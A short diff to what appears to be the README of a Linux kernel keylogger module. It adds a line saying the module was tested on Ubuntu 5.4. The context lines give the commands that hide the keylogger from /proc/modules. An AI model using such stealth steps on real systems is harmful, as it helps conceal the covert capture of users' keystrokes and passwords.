@@ -23,3 +23,4 @@
 <p><b>remember that after hiding the module will remove form /proc/modules and will not be recover, im working on fix it</b><p>
 <p>cd /sys/kernel/debug/keylogger</p>
 <p>./hide</p>
+<h3>Tested on Linux ubuntu 5.4.0-52-generic </h3>
